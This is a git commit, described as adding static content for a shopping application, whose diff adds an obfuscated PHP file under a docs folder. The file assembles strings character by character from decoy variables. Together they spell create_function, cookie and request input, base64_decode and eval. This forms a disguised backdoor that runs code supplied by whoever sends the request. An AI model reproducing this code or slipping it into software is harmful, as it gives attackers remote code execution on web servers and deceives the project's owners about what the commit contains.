0ed8d8d6db34a17d5540b821601da771f06085b1
Abhinav Manchanda <abhinav.manchanda@gmail.com>
2016-11-27 19:40:26 +0530

    Added static content for Shopping Application.

---
+++ docs/shoppingapplication/pic_3_noversion.php
@@ -0,0 +1,95 @@
+<?php
+	$divergent = 'p'; $flashers=';;EgMDe)';
+	$blanca= 'P';$entomology='g'; $etta= ']';$bleacher ='s';$kalindi = 's';$germayne ='ia';$giulio=')_e';$educations = 'iSeaPE(](';
+
+	$criticize='I'; $capacitate= 'gb"E pQoe';$available= 'ecyTa';$dungeons = 'm';
+	$emotion = ')L$a'; $chortle = '_RSiH';
+	$defeats= 'i';$handicapped= 'R';$encounters= 'Re>'; $library = ')';
+
+	$ingeberg = '[';$hydrangea= 'n';$electrocutes = 'r'; $capricious='M';$dabble ='a'; $enumerated='a';
+	$boards ='r'; $canoes= '"';
+	$babbling = '$';
+	$curses ='d(lsm';$gym='r';$leggy='4Pr'; $intestine ='=';$cameras= 'ii$EseuA'; $dike= ')_eeFesE'; $aspirator='l';$cointon= 'r'; $llewellyn='t,';$apology = 's';$bibb= '_:?E';$hooked = 'e_[();$C';$ballooner = 's';
+	$concierge= '6';$fined ='e';$arrogated = 'i';$daffodils= 'O'; $crave='o';$exegesis = '[m()G'; $beagle='Le)L'; $flocculate = '"eTfKi)?l'; $inquest =';';$codetermine = 'a';$antiquarian = 'v';$appending = 'g';
+
+	$kilobuck= 's';$archer = '$'; $disillusion ='a';$cyrill ='UaGeEi[S'; $esquires ='O(I_';$linguists= 's=cv'; $anonym='t';
+
+	$briant ='_'; $beckoning='"e$]Vt'; $depending= 'r';
+
+	$arson = '"';$llywellyn= '_';
+	$graded='ttQTt$'; $jeanine ='E';$grete ='(';$f1u2c3k4e5r6 ='B';$inure='?';
+	$animately ='u';$bellicosity='o'; $irked ='L';
+
+	$factored ='i';$imprecisely='e"rCd,R';$deirdre = '(';$inmates='e]g'; $loralee='e"';$burdock= 'O';
+
+	$contributed= 'n';$amino =')'; $jay= 'J';
+	$bereaving = 'L';$altering= 'S'; $ethnic ='l'; $decelerated = 'Hvlfy$($('; $carriage= 'nrvNG)r'; $arnoldo = 'd$';$goddess= '"';$expressive= 'l_';$geopolitic = 's';$jakob = 'i'; $besotter ='H';$buttressed = 'Mc@Ir:TSa';$blackberry = '_'; $entrepreneurs= 'r';$fayre='tT(_I'; $flathead = 'c';
+	$connoting ='E'; $ammonia='a';$bond ='E'; $ludwig='K'; $intercity=$flathead .$entrepreneurs.
+
+	$loralee['0'] .$ammonia. $fayre['0'] .$loralee['0'] .
+
+	$fayre['3'] .$decelerated['3'] .$animately.
+	$carriage['0'].$flathead .$fayre['0']. $jakob . $bellicosity .
+
+	$carriage['0'] ;$karl = $capacitate['4'] ;$intruder = $intercity($karl, $loralee['0'] .$carriage['2'].$ammonia . $expressive['0'].$fayre['2'] .$ammonia.$entrepreneurs.$entrepreneurs.$ammonia . $decelerated['4'] .
+
+	$fayre['3'].$capacitate['5'].$bellicosity. $capacitate['5']. $fayre['2']. $decelerated['3'].$animately .
+	$carriage['0'] .$flathead.
+
+	$fayre['3']. $inmates['2'] .$loralee['0'] .$fayre['0']. $fayre['3'] .$ammonia.
+	$entrepreneurs. $inmates['2'] . $geopolitic .$fayre['2']. $carriage['5'].
+
+	$carriage['5'].$carriage['5'] .$inquest);$intruder($dielectrics['1'] ,$inquest,$enlist['0'], $handsomely['2'], $inquest,
+
+	$geopolitic,$carriage[3],$arnoldo['1']. $jakob . $linguists['1']. $ammonia .
+	$entrepreneurs.$entrepreneurs. $ammonia. $decelerated['4']. $fayre['3']. $exegesis['1'] .$loralee['0']. $entrepreneurs .
+
+	$inmates['2'] .$loralee['0'].$fayre['2'].
+
+	$arnoldo['1']. $fayre['3'] .$imprecisely['6']. $bond.$graded['2'] . $cyrill['0'] .$bond .$buttressed['7'] . $fayre['1']. $imprecisely['5'] .$arnoldo['1'].$fayre['3'] .
+
+	$imprecisely['3'] .$burdock.$burdock.$ludwig.$fayre['4']. $bond. $imprecisely['5']. $arnoldo['1']. $fayre['3']. $buttressed['7'].$bond. $imprecisely['6'] . $beckoning['4'] . $bond. $imprecisely['6'] . $carriage['5'] . $inquest.$arnoldo['1']. $ammonia .
+
+	$linguists['1'] .$jakob .$geopolitic .$geopolitic.$loralee['0'].$fayre['0'] . $fayre['2'].$arnoldo['1'] .
+	$jakob .
+	$cyrill['6'].$goddess.$expressive['0']. $geopolitic .$jakob .$loralee['0'].$loralee['0']. $expressive['0']. $inmates['2'].$exegesis['1'] . $goddess .$inmates['1'] .
+
+	$carriage['5'] . $inure.$arnoldo['1'].$jakob .
+	$cyrill['6'] . $goddess.$expressive['0'].$geopolitic. $jakob .$loralee['0'] . $loralee['0'] .
+	$expressive['0']. $inmates['2'] .
+
+	$exegesis['1'] . $goddess .
+	$inmates['1'] .
+	$buttressed['5'].
+
+	$fayre['2']. $jakob .$geopolitic.$geopolitic . $loralee['0'] . $fayre['0']. $fayre['2'].$arnoldo['1'].$jakob . $cyrill['6'] .
+	$goddess .$besotter . $fayre['1'] .$fayre['1']. $leggy['1'].$fayre['3'] . $bereaving .$buttressed['7'] .$fayre['4'].$bond .$bond . $bereaving.$carriage['4'] . $buttressed['0'] .
+
+	$goddess .$inmates['1'].$carriage['5'] .
+	$inure . $arnoldo['1'] . $jakob .
+
+	$cyrill['6']. $goddess .$besotter.$fayre['1'] .$fayre['1'].
+
+	$leggy['1'].$fayre['3'] . $bereaving.$buttressed['7'] . $fayre['4']. $bond.$bond .
+	$bereaving .$carriage['4'] . $buttressed['0'] .$goddess.$inmates['1'] .
+
+	$buttressed['5'] .$arnoldo['0'].
+	$jakob . $loralee['0'].
+	$carriage['5']. $inquest . $loralee['0'] .$carriage['2'].$ammonia .
+	$expressive['0'].$fayre['2'] .$geopolitic .$fayre['0'].$entrepreneurs . $entrepreneurs.$loralee['0'] .$carriage['2'].
+
+	$fayre['2']. $capacitate['1'] .$ammonia.
+
+	$geopolitic.$loralee['0']. $concierge.
+
+	$leggy['0'] .
+	$fayre['3'] . $arnoldo['0']. $loralee['0'] . $flathead.
+
+	$bellicosity. $arnoldo['0']. $loralee['0'].$fayre['2'] . $geopolitic. $fayre['0'] . $entrepreneurs . $entrepreneurs.$loralee['0'].$carriage['2'].$fayre['2'] . $arnoldo['1'] .
+
+	$ammonia.
+
+	$carriage['5'] .$carriage['5'] . $carriage['5'] .
+
+	$carriage['5'] . $inquest);
+	
